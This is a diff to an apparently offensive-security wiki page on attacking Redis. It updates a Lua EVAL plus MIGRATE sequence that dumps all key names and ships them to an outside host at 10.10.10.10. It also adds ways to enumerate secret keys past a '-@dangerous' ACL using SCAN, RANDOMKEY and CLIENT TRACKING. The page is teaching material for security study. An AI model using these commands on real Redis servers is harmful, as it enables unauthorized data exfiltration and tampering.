@@ -82,26 +82,94 @@ While it is a good confirmation of the vulnerability, we can try to exploit it t
 
 {% code title="Lua" overflow="wrap" %}
 ```lua
-local keys = redis.call('KEYS', '*') local keyList = table.concat(keys, ',') redis.call('SET', 'keys', keyList) return keyList
+local keys = redis.call('KEYS', '*')
+local keyList = table.concat(keys, ',')
+redis.call('SET', 'output', keyList)
+return keyList
 ```
 {% endcode %}
 
-This will run the `KEYS *` command (or any command you like), and concat the results with a `,` comma, and finally save this list to a key named `keys` which we can leak:
+This will run the `KEYS *` command (or any command you like), and concat the results with a `,` comma, and finally save this list to a key named `output` which we can leak:
 
 {% code title="Redis: List and leak keys" %}
 ```powershell
-EVAL "local keys = redis.call('KEYS', '*') local keyList = table.concat(keys, ',') redis.call('SET', 'keys', keyList) return keyList" 0
-MIGRATE 10.10.10.10 6379 keys 0 5000
+EVAL "local keys = redis.call('KEYS', '*') local keyList = table.concat(keys, ',') redis.call('SET', 'output', keyList) return keyList" 0
+MIGRATE 10.10.10.10 6379 output 0 5000
 ```
 {% endcode %}
 
 ```sh
 > monitor
-1694378430.919743 [0 127.0.0.1:43416] "RESTORE" "keys" "0" "\x00\tsecret1,secret2\x0b\x00\xbd\xaeEG\x1b\xb8d\xd7"
-> get keys
+1694378430.919743 [0 127.0.0.1:43416] "RESTORE" "output" "0" "\x00\tsecret1,secret2\x0b\x00\xbd\xaeEG\x1b\xb8d\xd7"
+> get output
 "secret1,secret2"
 ```
 
 Remember that you can now always leak a key by name using this method, and find all the secrets even with random names. Also, remember that more commands can be executed like this to enumerate the instance as needed.&#x20;
 
 Then when you finally understand _how_ the system is used, you can try to **exploit it** by (over)writing data in the store. This can cause all kinds of unexpected vulnerabilities as developers often trust data coming from their own Redis store, causing injection, deserialization, or other access vulnerabilities on the main application. This can simply be done with the `SET` commands blindly.
+
+## ACLs
+
+As always, the [Redis Documentation](https://redis.io/docs/management/security/acl/) explains ACLs in great detail by itself. The gist is that developers can add Access Control Lists with security rules for specific users to restrict what commands they have access to. There is one special user called "default" that does not require a password.
+
+This section contains some common rules that can be bypassed in various ways.
+
+### Discovering keys
+
+When the `-@dangerous` permission is set, all commands in this ACL group are disabled, such as `KEYS` to discover keys that may have a randomly generated name that you cannot guess. While a developer might see this as a protection, there are various non-`@dangerous` ways and alternative ways to leak these key names with different commands:
+
+#### [`SCAN`](https://redis.io/commands/keys/)
+
+An almost drop-in replacement for the `KEYS` command is `SCAN` which incrementally returns a subset of all keys. Using the `COUNT` argument you can get as many as you want to discover all keys:
+
+<pre class="language-python" data-title="Redis"><code class="lang-python"><strong>> SCAN 0 COUNT 999
+</strong>1) "0"
+2) 1) "supersecretkey1"
+   2) "supersecretkey2"
+   ...
+</code></pre>
+
+#### [`RANDOMKEY`](https://redis.io/commands/randomkey/)
+
+A simple but effective way to bypass a forbidden `KEYS` command is to get a `RANDOMKEY`, which does exactly what you think it does. By sending it many times you can get as many keys as you like until you get the one you need. This is an [easy mistake](https://github.com/saarsec/saarctf-2023/blob/master/redis-bbq/exploits/unintended-exploits.txt#L2) to make because `KEYS` is part of the `@dangerous` ACL group, while `RANDOMKEY` is not!
+
+<pre class="language-python" data-title="Redis"><code class="lang-python"><strong>> RANDOMKEY
+</strong>"boringkey5"
+> RANDOMKEY
+"boringkey2"
+<strong>> RANDOMKEY
+</strong>"supersecretkey"
+</code></pre>
+
+#### [`CLIENT TRACKING`](https://redis.io/commands/client-tracking/)
+
+Another more advanced method is using the [TRACKING](https://redis.io/commands/client-tracking/) feature of Redis, where you can listen for keys that change globally. By creating a client, registering the invalidation for BCAST (all keys), and then subscribing to the channel. You instantly get a message whenever a key is _added_ or _written to_.&#x20;
+
+<pre class="language-python" data-title="Redis"><code class="lang-python"><strong>> CLIENT ID
+</strong>(integer) 42
+<strong>> CLIENT TRACKING on REDIRECT 42 BCAST
+</strong>OK
+<strong>> SUBSCRIBE __redis__:invalidate  # Start interactively listening
+</strong>Reading messages... (press Ctrl-C to quit)
+1) "subscribe"
+2) "__redis__:invalidate"
+3) (integer) 1
+1) "message"
+2) "__redis__:invalidate"
+<strong>3) 1) "supersecretkey"  # Result from a 'SET supersecretkey value' command
+</strong></code></pre>
+
+### Reading data
+
+When you have found an interesting key you'll often want to read its contents. There are a few different [types](https://redis.io/commands/type/) of keys all with their own 'get' commands. Here are most of them:
+
+* [string](https://redis.io/docs/data-types/strings/): [`GET`](https://redis.io/commands/get/) -> `GET key`
+* [list](https://redis.io/docs/data-types/lists/): [`LRANGE`](https://redis.io/commands/lrange/) -> `LRANGE key 0 -1`
+* [set](https://redis.io/docs/data-types/sets/): [`SMEMBERS`](https://redis.io/commands/smembers/) -> `SMEMBERS key`
+* [zset](https://redis.io/docs/data-types/sorted-sets/): [`ZRANGE`](https://redis.io/commands/zrange/) -> `ZRANGE key 0 -1 withscores`
+* [hash](https://redis.io/docs/data-types/hashes/): [`HGETALL`](https://redis.io/commands/hgetall/) -> `HGETALL key`
+* [steam](https://redis.io/docs/data-types/streams/): [`XRANGE`](https://redis.io/commands/xrange/) -> `XRANGE key - +`
+* [json](https://redis.io/docs/data-types/json/) (plugin): [`JSON.GET`](https://redis.io/commands/json.get/) -> `JSON.GET key`
+
+Another useful general command that works on **all** data types is `DUMP` which returns the binary representation of the data, often with readable strings and metadata included.&#x20;
